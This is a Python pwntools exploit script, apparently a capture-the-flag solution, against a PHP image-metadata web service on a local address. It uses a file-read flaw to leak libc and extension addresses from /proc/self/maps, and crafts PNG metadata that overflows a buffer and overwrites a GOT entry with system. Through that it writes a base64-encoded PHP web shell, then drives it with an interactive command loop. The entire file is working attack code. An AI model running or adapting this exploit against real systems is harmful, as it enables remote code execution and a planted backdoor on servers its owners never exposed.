#!/usr/bin/python3

from PIL import Image
from PIL.PngImagePlugin import PngInfo
from requests import get, post
from pwn import *
import re
from base64 import b64decode

URL = "http://172.17.0.2:8000"

meta = {
    "Artist": "CCCCC",
    "Title": "Title",
    "Copyright": "test"
}

image = "./hack.png"

def write_png_metadata(image_path, metadata_dict):
    image = Image.open(image_path)

    metadata = PngInfo()

    for key, value in metadata_dict.items():
        metadata.add_text(key, value)

    image.save(image_path, pnginfo=metadata)

def upload(image):
    global URL

    with open(image, "rb") as file:
        files = {"file":file}
        res = post(URL + "/upload.php", files=files)
    return res

# Leaking Addresses

res = get(f"{URL}/view.php?image=/proc/self/maps")

base64_pattern = r'data:image\/png;base64,([^"]+)'
match = re.search(base64_pattern, res.text)

if match:
    vmmap = b64decode(match.group(1)).decode()
    log.info("Read the /proc/self/maps")

    pattern = re.compile(r"([0-9a-f]+)-[0-9a-f]+ [rwxp\-]{4} \d{8} \d{2}:\d{2} \d+ +.*/metadata_reader\.so")
    match = pattern.search(vmmap)

    EXT_BASE = int("0x" + match.group(1), 16)

    pattern = re.compile(r"([0-9a-f]+)-[0-9a-f]+ [rwxp\-]{4} \d{8} \d{2}:\d{2} \d+ +.*/libc\.so\.6")
    match = pattern.search(vmmap)

    LIBC_BASE = int("0x" + match.group(1), 16)

    log.info("extension base address: " + hex(EXT_BASE))
    log.info("libc base address: " + hex(LIBC_BASE))

else:
    log.error("Can't read the /proc/self/maps, the exploit will exit")
    exit()



SYSTEM = LIBC_BASE + 0x4c3a0
GOT = EXT_BASE + 0x4090

log.info("libc system address: " + hex(SYSTEM))
log.info("global offset table address for efree: " + hex(GOT))

CMD1 = b"echo PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4= > tmp"
CMD2 = b"base64 -d < tmp > cmd.php ; echo "

meta["Artist"] = CMD2 + b"A" * (56 - len(CMD2)) + p64(GOT)
meta["Title"] = CMD1
meta["Copyright"] =  p64(SYSTEM)

write_png_metadata(image, meta)

res = upload(image)

while True:
    cmd = input("$ ")
    print(get(URL + f"/cmd.php?cmd={cmd}").text)